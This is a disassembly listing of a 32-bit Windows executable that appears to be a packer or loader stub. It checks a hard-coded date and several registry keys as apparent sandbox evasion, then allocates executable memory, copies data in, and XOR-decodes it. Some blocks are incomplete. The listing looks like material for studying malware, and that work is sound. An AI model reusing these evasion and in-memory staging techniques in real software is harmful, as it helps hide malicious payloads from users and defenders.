0x004420b0:	pushl	%ebp	; from: 0x0044260a(MAY), 0x004424f6(MAY)
0x004420b1:	movl	%esp, %ebp
0x004420b3:	subl	$0xc, %esp
0x004420b6:	movl	$0x1e4dc, -8(%ebp)
0x004420bd:	movl	$0x3000, -12(%ebp)
0x004420c4:	movl	$0x40, -4(%ebp)
0x004420cb:	movl	-4(%ebp), %eax
0x004420ce:	pushl	%eax
0x004420cf:	movl	-12(%ebp), %ecx
0x004420d2:	pushl	%ecx
0x004420d3:	movl	0x8(%ebp), %edx
0x004420d6:	pushl	%edx
0x004420d7:	pushl	$0x0
0x004420d9:	pushl	$0xffffffff
0x004420db:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff0016a0(MAY)
0x004420e1:	movl	%ebp, %esp
0x004420e3:	popl	%ebp
0x004420e4:	ret	; targets: 0x004424fb(MAY), 0x0044260f(MAY)

0x004420f0:	pushl	%ebp	; from: 0x00442514(MAY)
0x004420f1:	movl	%esp, %ebp
0x004420f3:	popl	%ebp
0x004420f4:	ret	; targets: 0x00442519(MAY)

0x00442100:	pushl	%ebp	; from: 0x00442548(MAY)
0x00442101:	movl	%esp, %ebp
0x00442103:	subl	$0x8, %esp
0x00442106:	movl	0x8(%ebp), %eax
0x00442109:	movl	%eax, -4(%ebp)
0x0044210c:	movl	0xc(%ebp), %ecx
0x0044210f:	movl	%ecx, -8(%ebp)
0x00442112:	movl	-4(%ebp), %edx
0x00442115:	cmpl	-8(%ebp), %edx
0x00442118:	jae	0x00442121	; targets: 0x00442121(MAY), 0x0044211a(MAY)
0x0044211a:	movl	-4(%ebp), %eax	; from: 0x00442118(MAY)
0x0044211d:	jmp	0x00442124	; targets: 0x00442124(MAY)
0x00442121:	movl	-8(%ebp), %eax	; from: 0x00442118(MAY)
0x00442124:	movl	%ebp, %esp	; from: 0x0044211d(MAY)
0x00442126:	popl	%ebp
0x00442127:	ret	; targets: 0x0044254d(MAY)

0x00442130:	pushl	%ebp	; from: 0x0044240f(MAY)
0x00442131:	movl	%esp, %ebp
0x00442133:	movl	$0x401004, 0x00446c68
0x0044213d:	popl	%ebp
0x0044213e:	ret	; targets: 0x00442414(MAY)

0x00442140:	pushl	%ebp	; from: 0x004425ea(MAY)
0x00442141:	movl	%esp, %ebp
0x00442143:	movl	$0x441230, 0x00446c68
0x0044214d:	popl	%ebp
0x0044214e:	ret	; targets: 0x004425ef(MAY)

0x00442150:	pushl	%ebp	; from: 0x004425f5(MAY), 0x004424e1(MAY)
0x00442151:	movl	%esp, %ebp
0x00442153:	movl	0x8(%ebp), %eax
0x00442156:	movl	-4(%eax), %eax
0x00442159:	popl	%ebp
0x0044215a:	ret	; targets: 0x004424e6(MAY), 0x004425fa(MAY)

0x004421e0:	pushl	%ebp	; from: 0x004425ce(MAY)
0x004421e1:	movl	%esp, %ebp
0x004421e3:	subl	$0x24, %esp
0x004421e6:	movl	$0xdbc8, -8(%ebp)
0x004421ed:	movl	$0x0, -16(%ebp)
0x004421f4:	jmp	0x004421ff	; targets: 0x004421ff(MAY)
0x004421ff:	movl	-16(%ebp), %ecx	; from: 0x004421f4(MAY)
0x00442202:	cmpl	0xc(%ebp), %ecx
0x00442205:	jae	0x004422d1	; targets: 0x004422d1(MAY), 0x0044220b(MAY)
0x0044220b:	movl	$0xdbc8, -8(%ebp)	; from: 0x00442205(MAY)
0x00442212:	cmpl	$0x0, -16(%ebp)
0x00442216:	jne	0x00442268	; targets: 0x00442218(MAY)
0x00442218:	pushl	$0x104	; from: 0x00442216(MAY)
0x0044221d:	pushl	$0x446c6c
0x00442222:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff001680(MAY)
0x00442228:	pushl	$0x444000
0x0044222d:	pushl	$0x446c6c
0x00442232:	call	lstrcatA@kernel32.dll	; targets: 0xff001660(MAY)
0x00442238:	pushl	$0x0
0x0044223a:	pushl	$0x80
0x0044223f:	pushl	$0x3
0x00442241:	pushl	$0x0
0x00442243:	pushl	$0x3
0x00442245:	pushl	$0x1
0x00442247:	pushl	$0x446c6c
0x0044224c:	call	CreateFileA@kernel32.dll	; targets: 0xff001640(MAY)
0x00442252:	movl	%eax, -4(%ebp)
0x00442255:	cmpl	$0xffffffff, -4(%ebp)
0x00442259:	je	0x00442261	; targets: 0x0044225b(MAY), 0x00442261(MAY)
0x0044225b:	cmpl	$0x0, -4(%ebp)	; from: 0x00442259(MAY)
0x0044225f:	jne	0x00442268	; targets: 0x00442261(MAY), 0x00442268(MAY)
0x00442261:	movl	$0x42, %eax	; from: 0x0044225f(MAY), 0x00442259(MAY)
0x00442266:	jmp	0x004422d1	; targets: 0x004422d1(MAY)
0x00442268:	movl	$0xdbc8, -8(%ebp)	; from: 0x0044225f(MAY)
0x0044226f:	movl	-16(%ebp), %edx
0x00442272:	addl	$0x28b7b, %edx
0x00442278:	movl	%edx, 0x00446d70
0x0044227e:	movl	0x8(%ebp), %eax
0x00442281:	addl	-16(%ebp), %eax
0x00442284:	movl	(%eax), %ecx
0x00442286:	addl	-16(%ebp), %ecx
0x00442289:	movl	0x8(%ebp), %edx
0x0044228c:	addl	-16(%ebp), %edx
0x0044228f:	movl	%ecx, (%edx)
0x00442291:	movl	-12(%ebp), %eax
0x00442294:	movl	%eax, -20(%ebp)
0x00442297:	movl	$0xdbc8, -8(%ebp)
0x0044229e:	movl	0x00446d70, %ecx
0x004422a4:	movl	%ecx, -36(%ebp)
0x004422a7:	movl	-36(%ebp), %edx
0x004422aa:	movl	%edx, -32(%ebp)
0x004422ad:	movl	-32(%ebp), %eax
0x004422b0:	movl	%eax, -28(%ebp)
0x004422b3:	movl	-28(%ebp), %ecx
0x004422b6:	movl	%ecx, -24(%ebp)
0x004422b9:	movl	0x8(%ebp), %edx
0x004422bc:	addl	-16(%ebp), %edx
0x004422bf:	movl	(%edx), %eax
0x004422c1:	xorl	-24(%ebp), %eax
0x004422d1:	movl	%ebp, %esp	; from: 0x00442266(MAY), 0x00442205(MAY)
0x004422d3:	popl	%ebp
0x004422d4:	ret	; targets: 0x004425d3(MAY)

0x00442340:	pushl	%ebp	; from: 0x004423e8(MAY), 0x0044248f(MAY)
0x00442341:	movl	%esp, %ebp
0x00442343:	subl	$0x8, %esp
0x00442346:	movl	$0x444018, -4(%ebp)
0x0044234d:	leal	-8(%ebp), %eax
0x00442350:	pushl	%eax
0x00442351:	pushl	$0x20019
0x00442356:	pushl	$0x0
0x00442358:	pushl	$0x446c60
0x0044235d:	pushl	$0x80000002
0x00442362:	call	0x00446d74	; targets: 0xff0019d0(MAY)
0x00442368:	testl	%eax, %eax
0x0044236a:	je	0x00442373	; targets: 0x0044236c(MAY), 0x00442373(MAY)
0x0044236c:	xorl	%eax, %eax	; from: 0x0044236a(MAY)
0x0044236e:	jmp	0x00442414	; targets: 0x00442414(MAY)
0x00442373:	leal	-8(%ebp), %ecx	; from: 0x0044236a(MAY)
0x00442376:	pushl	%ecx
0x00442377:	pushl	$0x20019
0x0044237c:	pushl	$0x0
0x0044237e:	pushl	$0x446c64
0x00442383:	pushl	$0x80000002
0x00442388:	call	0x00446d74	; targets: 0xff0019d0(MAY)
0x0044238e:	testl	%eax, %eax
0x00442390:	je	0x00442396	; targets: 0x00442396(MAY), 0x00442392(MAY)
0x00442392:	xorl	%eax, %eax	; from: 0x00442390(MAY)
0x00442394:	jmp	0x00442414	; targets: 0x00442414(MAY)
0x00442396:	movl	$0x53, %edx	; from: 0x00442390(MAY)
0x0044239b:	movl	-4(%ebp), %eax
0x0044239e:	movw	%dx, (%eax)
0x004423a1:	leal	-8(%ebp), %ecx
0x004423a4:	pushl	%ecx
0x004423a5:	pushl	$0x20019
0x004423aa:	pushl	$0x0
0x004423ac:	movl	-4(%ebp), %edx
0x004423af:	pushl	%edx
0x004423b0:	movl	-8(%ebp), %eax
0x004423b3:	pushl	%eax
0x004423b4:	call	0x00446d74	; targets: 0xff0019d0(MAY)
0x004423ba:	testl	%eax, %eax
0x004423bc:	je	0x004423c2	; targets: 0x004423be(MAY), 0x004423c2(MAY)
0x004423be:	xorl	%eax, %eax	; from: 0x004423bc(MAY)
0x004423c0:	jmp	0x00442414	; targets: 0x00442414(MAY)
0x004423c2:	leal	-8(%ebp), %ecx	; from: 0x004423bc(MAY)
0x004423c5:	pushl	%ecx
0x004423c6:	pushl	$0x20019
0x004423cb:	pushl	$0x0
0x004423cd:	pushl	$0x444030
0x004423d2:	movl	-8(%ebp), %edx
0x004423d5:	pushl	%edx
0x004423d6:	call	0x00446d74	; targets: 0xff0019d0(MAY)
0x004423dc:	testl	%eax, %eax
0x004423de:	je	0x004423ed	; targets: 0x004423e0(MAY), 0x004423ed(MAY)
0x004423e0:	pushl	$0x1	; from: 0x004423de(MAY)
0x004423e2:	pushl	$0x1
0x004423e4:	pushl	$0x1
0x004423e6:	pushl	$0x1
0x004423e8:	call	0x00442340	; targets: 0x00442340(MAY)
0x004423ed:	leal	-8(%ebp), %eax	; from: 0x004423de(MAY), 0x00442417(MAY)
0x004423f0:	pushl	%eax
0x004423f1:	pushl	$0x20019
0x004423f6:	pushl	$0x0
0x004423f8:	pushl	$0x4440a8
0x004423fd:	movl	-8(%ebp), %ecx
0x00442400:	pushl	%ecx
0x00442401:	call	0x00446d74	; targets: 0xff0019d0(MAY)
0x00442407:	testl	%eax, %eax
0x00442409:	jne	0x0044240f	; targets: 0x0044240f(MAY), 0x0044240b(MAY)
0x0044240b:	xorl	%eax, %eax	; from: 0x00442409(MAY)
0x0044240d:	jmp	0x00442414	; targets: 0x00442414(MAY)
0x0044240f:	call	0x00442130	; targets: 0x00442130(MAY)	; from: 0x00442409(MAY)
0x00442414:	movl	%ebp, %esp	; from: 0x0044236e(MAY), 0x00442394(MAY), 0x004423c0(MAY), 0x0044213e(MAY), 0x0044240d(MAY)
0x00442416:	popl	%ebp
0x00442417:	ret	$0x10	; targets: 0x00442494(MAY), 0x004423ed(MAY)


start:
0x00442420:	pushl	%ebp
0x00442421:	movl	%esp, %ebp
0x00442423:	subl	$0x4d4, %esp
0x00442429:	pusha	
0x0044242a:	movl	%ebp, 0x00446d78
0x00442430:	movl	$0x0, -1184(%ebp)
0x0044243a:	movl	$0x80000002, -1204(%ebp)
0x00442444:	movl	$0xe1d58000, -8(%ebp)
0x0044244b:	movl	$0x1a8e79f, -4(%ebp)
0x00442452:	movl	RegOpenKeyExW@advapi32.dll, %eax
0x00442457:	movl	%eax, 0x00446d74
0x0044245c:	leal	-1208(%ebp), %ecx
0x00442462:	pushl	%ecx
0x00442463:	leal	-1212(%ebp), %edx
0x00442469:	pushl	%edx
0x0044246a:	leal	-8(%ebp), %eax
0x0044246d:	pushl	%eax
0x0044246e:	call	FileTimeToDosDateTime@kernel32.dll	; targets: 0xff001620(MAY)
0x00442474:	movzwl	-1212(%ebp), %ecx
0x0044247b:	cmpl	$0x21, %ecx
0x0044247e:	je	0x00442487	; targets: 0x00442487(MAY), 0x00442480(MAY)
0x00442480:	xorl	%eax, %eax	; from: 0x0044247e(MAY)
0x00442482:	jmp	0x00442755	; targets: 0x00442755(MAY)
0x00442487:	pushl	$0x1	; from: 0x0044247e(MAY)
0x00442489:	pushl	$0x1
0x0044248b:	pushl	$0x1
0x0044248d:	pushl	$0x1
0x0044248f:	call	0x00442340	; targets: 0x00442340(MAY)
0x00442494:	movl	$0x0, -1060(%ebp)	; from: 0x00442417(MAY)
0x0044249e:	movl	$0x64, -1172(%ebp)
0x004424a8:	movl	$0x1, -1068(%ebp)
0x004424b2:	movl	$0x0, -1184(%ebp)
0x004424bc:	movl	$0x0, -1124(%ebp)
0x004424c6:	movl	$0x1, -1168(%ebp)
0x004424d0:	movl	$0x3, -1064(%ebp)
0x004424da:	movl	0x00446c68, %edx
0x004424e0:	pushl	%edx
0x004424e1:	call	0x00442150	; targets: 0x00442150(MAY)
0x004424e6:	addl	$0x4, %esp	; from: 0x0044215a(MAY)
0x004424e9:	movl	%eax, -1188(%ebp)
0x004424ef:	movl	-1188(%ebp), %eax
0x004424f5:	pushl	%eax
0x004424f6:	call	0x004420b0	; targets: 0x004420b0(MAY)
0x004424fb:	addl	$0x4, %esp	; from: 0x004420e4(MAY)
0x004424fe:	movl	%eax, -1180(%ebp)
0x00442504:	movl	-1188(%ebp), %ecx
0x0044250a:	pushl	%ecx
0x0044250b:	pushl	$0x0
0x0044250d:	movl	-1180(%ebp), %edx
0x00442513:	pushl	%edx
0x00442514:	call	0x004420f0	; targets: 0x004420f0(MAY)
0x00442519:	addl	$0xc, %esp	; from: 0x004420f4(MAY)
0x0044251c:	movl	-1188(%ebp), %eax
0x00442522:	movl	%eax, -1196(%ebp)
0x00442528:	movl	-1184(%ebp), %ecx	; from: 0x004425bb(MAY)
0x0044252e:	cmpl	-1188(%ebp), %ecx
0x00442534:	jae	0x004425c0	; targets: 0x0044253a(MAY), 0x004425c0(MAY)
0x0044253a:	movl	-1196(%ebp), %edx	; from: 0x00442534(MAY)
0x00442540:	pushl	%edx
0x00442541:	movl	-1172(%ebp), %eax
0x00442547:	pushl	%eax
0x00442548:	call	0x00442100	; targets: 0x00442100(MAY)
0x0044254d:	addl	$0x8, %esp	; from: 0x00442127(MAY)
0x00442550:	movl	%eax, -1200(%ebp)
0x00442556:	movl	-1200(%ebp), %ecx
0x0044255c:	pushl	%ecx
0x0044255d:	movl	0x00446c68, %edx
0x00442563:	addl	-1124(%ebp), %edx
0x00442569:	pushl	%edx
0x0044256a:	movl	-1180(%ebp), %eax
0x00442570:	addl	-1184(%ebp), %eax
0x00442576:	pushl	%eax
0x00442577:	call	0x00442d3c	; targets: 0x00442d3c(MAY)
0x0044257c:	addl	$0xc, %esp
0x0044257f:	movl	-1068(%ebp), %ecx
0x00442585:	addl	-1172(%ebp), %ecx
0x0044258b:	addl	-1124(%ebp), %ecx
0x00442591:	movl	%ecx, -1124(%ebp)
0x00442597:	movl	-1184(%ebp), %edx
0x0044259d:	addl	-1172(%ebp), %edx
0x004425a3:	movl	%edx, -1184(%ebp)
0x004425a9:	movl	-1196(%ebp), %eax
0x004425af:	subl	-1200(%ebp), %eax
0x004425b5:	movl	%eax, -1196(%ebp)
0x004425bb:	jmp	0x00442528	; targets: 0x00442528(MAY)
0x004425c0:	movl	-1188(%ebp), %ecx	; from: 0x00442534(MAY)
0x004425c6:	pushl	%ecx
0x004425c7:	movl	-1180(%ebp), %edx
0x004425cd:	pushl	%edx
0x004425ce:	call	0x004421e0	; targets: 0x004421e0(MAY)
0x004425d3:	addl	$0x8, %esp	; from: 0x004422d4(MAY)
0x004425d6:	movl	$0x0, -1124(%ebp)
0x004425e0:	movl	$0x0, -1220(%ebp)
0x004425ea:	call	0x00442140	; targets: 0x00442140(MAY)
0x004425ef:	movl	0x00446c68, %eax	; from: 0x0044214e(MAY)
0x004425f4:	pushl	%eax
0x004425f5:	call	0x00442150	; targets: 0x00442150(MAY)
0x004425fa:	addl	$0x4, %esp	; from: 0x0044215a(MAY)
0x004425fd:	movl	%eax, -1224(%ebp)
0x00442603:	movl	-1224(%ebp), %ecx
0x00442609:	pushl	%ecx
0x0044260a:	call	0x004420b0	; targets: 0x004420b0(MAY)
0x0044260f:	addl	$0x4, %esp	; from: 0x004420e4(MAY)
0x00442755:	movl	%ebp, %esp	; from: 0x00442482(MAY)
0x00442757:	popl	%ebp
0x00442758:	ret	; targets: 0xfee70000(MAY)

0x00442d3c:	jmp	memcpy@msvcrt.dll	; targets: 0xff0019c0(MAY)	; from: 0x00442577(MAY)
